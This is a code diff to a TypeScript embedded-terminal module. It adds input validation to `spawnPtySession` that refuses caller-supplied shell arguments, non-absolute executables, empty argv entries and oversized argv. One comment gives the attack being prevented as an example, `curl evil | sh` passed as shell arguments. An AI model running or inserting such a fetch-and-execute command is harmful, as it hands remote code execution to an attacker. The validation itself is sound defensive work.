@@ -2,9 +2,36 @@
 // Kill tree on close / heartbeat / process exit. Ack watermark → pause.
 
 import { spawn } from "child_process"
+import { isAbsolute } from "node:path"
 import { appendCapabilityAudit } from "../packs/audit-log"
 import { loadNodePty, type PtyHandle, type PtySpawnFn } from "./load-native"
 import { buildTerminalEnv } from "./env"
+
+/**
+ * Total (never-throwing) rendering of a caller-supplied value for a refusal message.
+ * `JSON.stringify` is NOT total: it throws on BigInt and circular structures, it invokes a
+ * caller-supplied `toJSON` (which may itself throw), and it renders `Symbol()` as `undefined`.
+ * The try/catch in `spawnPtySession` only wraps `spawnFn`, so a throw raised from a *refusal*
+ * branch escapes to the caller as an exception instead of `{ok:false}` — i.e. a caller passing a
+ * non-JSON `file` would crash instead of being refused. Keep this total for ANY input.
+ */
+function describeValue(v: unknown): string {
+  try {
+    switch (typeof v) {
+      case "string":
+        return JSON.stringify(v)
+      case "number":
+      case "boolean":
+      case "bigint":
+      case "symbol":
+        return String(v)
+      default:
+        return Object.prototype.toString.call(v)
+    }
+  } catch {
+    return "[unprintable]"
+  }
+}
 
 function killPidTree(pid: number): void {
   if (pid <= 0) return
@@ -32,6 +59,10 @@ export const TERMINAL_HIGH_WATER_UNACKED = 64 * 1024
 export const TERMINAL_LOW_WATER_UNACKED = 16 * 1024
 export const TERMINAL_MAX_UNACKED = 256 * 1024
 export const TERMINAL_HEARTBEAT_MS = 45_000
+/** Upper bound on the summed UTF-8 byte length of a caller-supplied argv (#502 C). */
+export const MAX_PTY_ARGV_BYTES = 128 * 1024
+/** Refusal code for malformed `spawnPtySession` opts: nothing was spawned, so it is not a spawn failure. */
+export const INVALID_PTY_OPTS = "invalid_pty_opts"
 
 export type TerminalClosedCode = number | "unsupported" | "denied" | "killed" | string
 
@@ -216,6 +247,17 @@ export function spawnPtySession(opts: {
   cols: number
   rows: number
   cwd: string
+  /** #502 C: agent embed launches an explicit executable instead of the login shell. Absolute only.
+   *  `undefined` = caller omitted it (interactive tab) → `$SHELL` default. A supplied value that is
+   *  not a non-empty absolute path is refused — never defaulted, never trimmed/repaired. (`$SHELL`
+   *  itself IS trimmed once, on the default branch below: a padded env value is not a path.) */
+  file?: string
+  /** #502 C: explicit argv for that executable; `[]` means "no args". Requires an explicit `file`:
+   *  a caller-supplied argv without one is refused (see `spawnPtySession`). `undefined` → `[]` when
+   *  `file` is given, `["-l"]` only for the `$SHELL` default. Non-string entries inside a real array
+   *  are dropped; a non-array, an empty-string entry, or an argv over `MAX_PTY_ARGV_BYTES` is a
+   *  caller bug and refused. */
+  args?: string[]
   threadId?: string
   reviewId?: string
   owner?: unknown
@@ -232,15 +274,86 @@ export function spawnPtySession(opts: {
     return { ok: false, error: "terminal_busy" }
   }
 
+  // #502 C invariant: the `-l` login-shell default and caller-supplied argv can never mix.
+  // `$SHELL` + caller argv is a free shell (`args: ["-c", "curl evil | sh"]`), so the agent-argv
+  // feature would double as a general shell-argv injector. Refused before env work and before any
+  // spawnFn call — including for `[]`, which is still a caller shaping the shell invocation.
+  const hasFile = opts.file !== undefined
+  if (!hasFile && opts.args !== undefined) {
+    return {
+      ok: false,
+      error: "embedded terminal args require an explicit absolute file",
+      code: INVALID_PTY_OPTS,
+    }
+  }
+
   const cols = Math.min(500, Math.max(1, Math.floor(opts.cols) || 80))
   const rows = Math.min(200, Math.max(1, Math.floor(opts.rows) || 24))
-  const file = process.env.SHELL && process.env.SHELL.trim() ? process.env.SHELL : "/bin/zsh"
+  // #502 C: `undefined` (caller omitted `file`) keeps today's login-shell default. A *supplied*
+  // file — including `""`, which means "agent path resolution failed" — must be a non-empty
+  // absolute path; substituting `$SHELL` here would claim "agent running" while handing the user
+  // an unrequested login shell. Refused before env work and before any spawnFn call.
+  let file: string
+  if (opts.file === undefined) {
+    // `$SHELL` is trimmed ONCE and the trimmed value is what spawns: `" /bin/bash "` cannot exist
+    // as a path, so trimming only for the emptiness check would guarantee ENOENT.
+    const shell = process.env.SHELL?.trim()
+    file = shell ? shell : "/bin/zsh"
+  } else if (typeof opts.file === "string" && opts.file.length > 0 && isAbsolute(opts.file)) {
+    // Used exactly as given: no trim/normalization of a malformed supplied path. This no-trim rule
+    // deliberately diverges from `rejectNonAbsoluteCommand` (src/acp/open-local-terminal.ts), which
+    // owns the same "must be absolute" rule WITH trimming (`" /bin/zsh"` is accepted there and
+    // refused here). The divergence is intentional; the two are wired together by a later task, so
+    // do not "unify" one into the other.
+    file = opts.file
+  } else {
+    return {
+      ok: false,
+      error: `embedded terminal file must be a non-empty absolute path (got ${describeValue(opts.file)})`,
+      code: INVALID_PTY_OPTS,
+    }
+  }
+  // #502 C: `-l` is a login-shell flag and belongs to the `$SHELL` default only — an explicit
+  // executable (agent binary) gets `[]` when the caller supplied no argv. A real array keeps only
+  // its string entries (junk dropped). Anything else is a bug in the agent-spec builder — falling
+  // back to `["-l"]` would launch `$SHELL -l` under an "agent running" tab, so it is refused
+  // loudly before spawning.
+  let args: string[]
+  if (opts.args === undefined) {
+    args = hasFile ? [] : ["-l"]
+  } else if (Array.isArray(opts.args)) {
+    args = opts.args.filter((a): a is string => typeof a === "string")
+    // An empty argv entry is refused, consistently with the empty-`file` rule above: `exec` would
+    // receive a real empty slot that some binaries read as a positional value, and silently
+    // dropping it would hide the builder bug instead of reporting it.
+    const emptyAt = args.indexOf("")
+    if (emptyAt >= 0) {
+      return {
+        ok: false,
+        error: `embedded terminal args must not contain an empty entry (index ${emptyAt})`,
+        code: INVALID_PTY_OPTS,
+      }
+    }
+  } else {
+    return { ok: false, error: "embedded terminal args must be a string[]", code: INVALID_PTY_OPTS }
+  }
+  // Every neighbour bounds its payload. An argv over ARG_MAX passes the spawn call and fails
+  // asynchronously (`posix_spawn failed: Argument list too long`), which would open the tab and
+  // then kill it — indistinguishable from a real exec failure.
+  const argvBytes = args.reduce((n, a) => n + Buffer.byteLength(a, "utf8"), 0)
+  if (argvBytes > MAX_PTY_ARGV_BYTES) {
+    return {
+      ok: false,
+      error: `embedded terminal args exceed MAX_PTY_ARGV_BYTES (${MAX_PTY_ARGV_BYTES}); got ${argvBytes} bytes`,
+      code: INVALID_PTY_OPTS,
+    }
+  }
   const env = buildTerminalEnv()
   const spawnFn: PtySpawnFn = spawnOverride || ((f, a, o) => loadNodePty().spawn(f, a, o))
 
   let handle: PtyHandle
   try {
-    handle = spawnFn(file, ["-l"], { name: "xterm-256color", cols, rows, cwd: opts.cwd, env })
+    handle = spawnFn(file, args, { name: "xterm-256color", cols, rows, cwd: opts.cwd, env })
   } catch (e: any) {
     return { ok: false, error: e?.message || String(e), code: "spawn_failed" }
   }
